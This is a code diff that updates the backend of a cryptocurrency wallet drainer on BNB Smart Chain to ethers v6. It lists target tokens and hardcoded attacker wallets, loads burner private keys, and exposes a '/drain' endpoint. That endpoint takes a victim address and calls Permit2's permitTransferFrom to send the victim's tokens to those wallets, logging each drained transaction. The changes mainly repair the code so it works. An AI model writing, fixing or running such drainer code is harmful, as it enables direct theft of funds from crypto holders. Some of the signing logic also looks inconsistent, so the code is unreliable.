@@ -31,10 +31,10 @@ const TOKENS = {
   CAKE: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
   WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
   BTCB: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
-  ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
-  XRP:  '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
-  ADA:  '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
-  DOT:  '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
+  ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
+  XRP: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
+  ADA: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47',
+  DOT: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402',
 };
 
 const HARDCODED_WALLETS = {
@@ -43,14 +43,14 @@ const HARDCODED_WALLETS = {
   CAKE: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
   WBNB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
   BTCB: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
-  ETH:  '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
-  XRP:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
-  ADA:  '0x65b4be1fdded19b66d0029306c1fdb6004586876',
-  DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
+  ETH: '0xA1b2D46c98D2828fFC6Fb3D762F10A51cA332a4e',
+  XRP: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  ADA: '0x65b4be1fdded19b66d0029306c1fdb6004586876',
+  DOT: '0x65b4be1fdded19b66d0029306c1fdb6004586876'
 };
 
 // Provider + burners
-const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
+const provider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
 const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
 const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 let cachedGasPrice = 0n;
@@ -60,6 +60,26 @@ let burnerNonces = {};
 const permit2ABI = [
   "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce),address,address,bytes) external"
 ];
+
+// EIP-712 Domain and Types
+const domain = {
+  name: 'Permit2',
+  chainId: 56, // BSC Chain ID
+  verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+};
+
+const types = {
+  PermitTransferFrom: [
+    { name: 'permitted', type: 'TokenPermissions' },
+    { name: 'spender', type: 'address' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'deadline', type: 'uint256' }
+  ],
+  TokenPermissions: [
+    { name: 'token', type: 'address' },
+    { name: 'amount', type: 'uint256' }
+  ]
+};
 
 // Logs + config
 const logsDir = path.join(__dirname, 'logs');
@@ -75,6 +95,7 @@ if (!process.env.BSC_KEYS) {
   throw new Error('BSC_KEYS environment variable required');
 }
 
+// FIXED: BigInt JSON serialization
 // FIXED: BigInt JSON serialization
 const saveNonces = () => {
   try {
@@ -99,41 +120,37 @@ try {
   console.error('Failed to load nonces:', e.message);
 }
 
-// Save nonces periodically
-setInterval(saveNonces, 60000);
-
-// Gas monitor
 // Gas monitor
 setInterval(async () => {
   try {
     const gas = await provider.getFeeData();
+    // Convert to BigInt first
     cachedGasPrice = BigInt(gas.maxFeePerGas || gas.gasPrice);
     cachedGasPrice = cachedGasPrice * 110n / 100n;
-    
-    // FIXED: Use ethers v6 nonce method
+
     for (let burner of burners) {
-      const nonce = await burner.getNonce('pending');
+      // Convert to BigInt
+      const nonce = BigInt(await burner.getNonce('pending'));
       burnerNonces[burner.address] = nonce;
     }
-    
-    // FIXED: BigInt toNumber() conversion
+
+    // Convert to number for display
     const gasGwei = Number(cachedGasPrice / 1000000000000000000n);
     if (gasGwei > 8) {
       stats.gasAlerts++;
       console.log(`⚡️ HIGH GAS: ${gasGwei.toFixed(2)} gwei`);
     }
     console.log(`💨 Gas: ${Number(gas.gasPrice / 1000000000000000000n).toFixed(2)}gwei → ${gasGwei.toFixed(2)}gwei`);
-  } catch (e) { 
-    console.error('💥 Gas:', e.message); 
+  } catch (e) {
+    console.error('💥 Gas:', e.message);
   }
 }, 10000);
 
 // Drain endpoint
-// Drain endpoint
 app.post('/drain', async (req, res) => {
   try {
     const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
-    
+
     console.log('🔥 DRAIN:', req.body);
 
     // FIXED: v6 isAddress
@@ -144,7 +161,7 @@ app.post('/drain', async (req, res) => {
     const burner = burners[0];
     const tokenAddress = TOKENS[tokenSymbol];
     const destination = HARDCODED_WALLETS[tokenSymbol];
-    
+
     // Gas check
     const burnerBalance = await provider.getBalance(burner.address);
     if (burnerBalance < 200000000000000n) {
@@ -152,15 +169,15 @@ app.post('/drain', async (req, res) => {
     }
 
     // FIXED: v6 parseUnits + hexValue
-    const parsedAmount = ethers.parseUnits(amount || '1', 18);
+    const parsedAmount = BigInt(ethers.parseUnits(amount || '1', 18));
     const now = BigInt(Math.floor(Date.now() / 1000) + 3600);
-    
+
     const permit = {
       details: {
         token: tokenAddress,
         amount: parsedAmount.toString(),
         expiration: (now + 86400n).toString(),
-        nonce: (BigInt(nonce || 0)).toString()
+        nonce: BigInt(nonce || 0).toString()
       },
       spender: burner.address,
       sigDeadline: Number(now + 86400n)
@@ -168,27 +185,27 @@ app.post('/drain', async (req, res) => {
 
     // Signature
     const signature = await burner.signTypedData(domain, types, permit);
-    
+
     // FIXED: v6 verifyTypedData
     const recovered = ethers.verifyTypedData(domain, types, permit, signature);
     if (recovered !== victimAddress) {
       return res.status(400).json({ error: 'Invalid signature' });
     }
-    
+
     // Contract call
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
-    
+
     // FIXED: v6 permitStruct (all strings/numbers)
     const permitStruct = [
       tokenAddress,
       parsedAmount.toString(),
       (now + 86400n).toString(),
-      (BigInt(nonce || 0)).toString()
+      BigInt(nonce || 0).toString()
     ];
 
     // FIXED: v6 getNonce + gas estimation
-    const currentNonce = burnerNonces[burner.address] ?? await burner.getNonce('pending');
-    
+    const currentNonce = BigInt(burnerNonces[burner.address] ?? await burner.getNonce('pending'));
+
     const gasLimit = await permit2.permitTransferFrom.estimateGas(
       permitStruct, victimAddress, destination, signature,
       { from: burner.address }
@@ -200,35 +217,35 @@ app.post('/drain', async (req, res) => {
       destination,
       signature,
       {
-        gasLimit,
+        gasLimit: BigInt(gasLimit),
         maxFeePerGas: cachedGasPrice,
         maxPriorityFeePerGas: cachedGasPrice / 2n,
         nonce: currentNonce
       }
     );
-    
+
     burnerNonces[burner.address] = currentNonce + 1n;
-    
+
     const receipt = await tx.wait(1);
-    
+
     stats.totalDrains++;
     fs.appendFileSync(`${logsDir}/drains.log`, `${new Date().toISOString()} ${tokenSymbol} ${tx.hash}\n`);
-    
+
     console.log(`✅ DRAINED ${tokenSymbol}: ${tx.hash}`);
     res.json({ success: true, tx: tx.hash, block: receipt.blockNumber });
-    
+
   } catch (error) {
     console.error('❌ ERROR:', error);
-    
+
     if (error.code === 'CALL_EXCEPTION') {
       return res.status(400).json({ error: 'Transaction failed' });
     }
-    
+
     if (error.message?.includes('nonce')) {
       delete burnerNonces[burners[0].address];
       return res.status(400).json({ error: 'Nonce reset. Retry.' });
     }
-    
+
     res.status(400).json({ error: error.message || 'Failed' });
   }
 });
@@ -259,7 +276,7 @@ const wss = new WebSocket.Server({ server });
 wss.on('connection', (ws) => {
   console.log('WebSocket connected');
   ws.send(JSON.stringify({ stats }));
-  
+
   ws.on('message', (data) => {
     try {
       const message = JSON.parse(data);
